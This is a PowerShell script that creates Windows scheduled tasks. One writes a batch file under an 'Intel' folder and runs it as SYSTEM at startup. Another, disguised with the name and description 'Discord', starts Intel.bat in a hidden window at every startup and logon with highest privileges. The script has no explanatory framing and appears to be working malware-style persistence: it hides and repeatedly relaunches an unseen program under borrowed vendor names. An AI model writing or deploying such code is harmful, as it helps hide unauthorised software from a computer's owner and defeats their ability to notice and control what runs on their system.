# Define paths
$batchFilePath = "$env:UserProfile\Intel\RunIntel.bat"
$taskName = "Run Intel Batch Every Minute"

# Create the batch file if it does not exist
$batchScript = @"
@echo off
setlocal

:: Path to Intel.bat
set "scriptPath=%userprofile%\Intel\Intel.bat"

:: Counter file to keep track of execution count
set "counterFile=%temp%\IntelRunCount.txt"

:: Initialize counter if not exists
if not exist "%counterFile%" echo 0 > "%counterFile%"

:: Read current count
set /p count=<"%counterFile%"

:: Check if the count is less than 10
if %count% lss 10 (
    :: Increment the count
    set /a count+=1
    echo %count% > "%counterFile%"

    :: Run Intel.bat hidden
    start "" /b cmd /c "%scriptPath%"

    :: Wait for 1 minute (60 seconds)
    timeout /t 60 /nobreak
)

:: Clean up counter file if the count reaches 10
if %count% geq 10 del "%counterFile%"
"@

# Write the batch script to file
Set-Content -Path $batchFilePath -Value $batchScript

# Define task action and trigger
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batchFilePath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Register the scheduled task
try {
    Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal -TaskName $taskName -ErrorAction Stop
    Write-Host "Scheduled task created successfully."
} catch {
    Write-Host "Error creating scheduled task: $_"
}


# Define the PowerShell command to run
$psCommand = 'Start-Process -FilePath "C:\Users\denni\Intel\Intel.bat" -WindowStyle Hidden'


# Get the current user
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Define the action to start PowerShell with the specified command
$action = New-ScheduledTaskAction -Execute "PowerShell" -Argument $psCommand

# Define triggers for the task
$triggers = @(
    New-ScheduledTaskTrigger -AtStartup
    New-ScheduledTaskTrigger -AtLogOn
    # Note: There are no built-in triggers for task creation/modification or workstation unlock
)

# Define the settings for the task
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable

# Register the scheduled task with the specified parameters
try {
    Register-ScheduledTask -Action $action -Trigger $triggers -TaskName "Discord" -Description "Discord" -User $currentUser -RunLevel Highest -Settings $settings
    Write-Host "Scheduled task 'Discord' created successfully."
} catch {
    Write-Host "Failed to create scheduled task. Error: $_" -ForegroundColor Red
}
